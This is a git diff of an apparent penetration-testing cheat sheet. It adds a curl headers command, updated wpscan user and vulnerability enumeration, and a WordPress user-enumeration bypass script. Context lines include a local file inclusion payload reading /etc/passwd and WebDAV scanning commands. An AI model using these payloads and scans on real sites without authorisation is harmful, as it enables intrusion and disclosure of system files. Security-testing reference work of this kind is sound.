@@ -95,6 +95,11 @@ When fuzzing headers, disable URL Encode.
 When you are inside of a POST parameter, always use URL encoding.
 ------------------------------------------------------------------------------------------------------
 
+# Headers
+
+curl -i -X targetURL
+------------------------------------------------------------------------------------------------------
+
 # Local file inclusion
 
 http://localhost/index.php?page=/etc/passwd
@@ -132,9 +137,12 @@ use auxiliary/scanner/http/webdav_scanner
 for i in $(cat 80.txt); do cadaver -t $i; done
 ------------------------------------------------------------------------------------------------------
 
-# WordPress XSS vuln
+# WordPress
 
-wpscan.rb - -url www.target.com - -enumerate p
+wpscan -u www.target.com -e u vp vt -r
+
+cd /usr/share/wpscan/
+stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
 ------------------------------------------------------------------------------------------------------
 
 # XML Injection
